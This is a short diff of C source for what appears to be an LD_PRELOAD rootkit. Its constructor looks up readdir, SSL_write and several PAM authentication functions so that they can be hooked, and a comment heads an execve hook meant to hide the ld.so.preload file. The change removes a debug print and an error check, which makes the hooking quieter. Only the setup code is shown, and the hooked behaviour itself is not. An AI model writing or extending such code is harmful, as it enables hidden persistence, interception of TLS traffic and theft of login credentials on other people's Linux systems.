@@ -35,11 +35,6 @@ int isDebuggerPresent();
 __attribute__((constructor)) void hook_init(void){
   og_readdir    = (struct dirent* (*)(DIR*))dlsym(RTLD_NEXT, "readdir");
   og_readdir64  = (struct dirent64* (*)(DIR*))dlsym(RTLD_NEXT, "readdir64");
-  printf("[+] readdir64 hooked\n");
-  if (dlerror() != NULL) {
-    fprintf(stderr, "Error: %s\n", dlerror());
-    exit(EXIT_FAILURE);
-  }
   og_SSL_write  = (int (*)(SSL*, const void*, int))dlsym(RTLD_NEXT, "SSL_write");
   og_pam_sm_auth = (int (*)(pam_handle_t*, int, int, const char**))dlsym(RTLD_NEXT, "pam_sm_authenticate");
   og_pam_sm_setcred = (int (*)(pam_handle_t*, int, int, const char**))dlsym(RTLD_NEXT, "pam_sm_setcred");
@@ -49,7 +44,6 @@ __attribute__((constructor)) void hook_init(void){
   og_pam_open_session = (int (*)(pam_handle_t *pamh, int flags))dlsym(RTLD_NEXT, "pam_open_session");
   og_pam_get_item = (int (*)(const pam_handle_t*, int, const void**))dlsym(RTLD_NEXT, "pam_get_item");
 }
-
 /*---------[ HOOK EXECVE TO HIDE THE LD.SO.PRELOAD FILE ]---------*/
 // probably doesnt work
 int execve(const char *pathname, char *const argv[], char *const envp[]) {
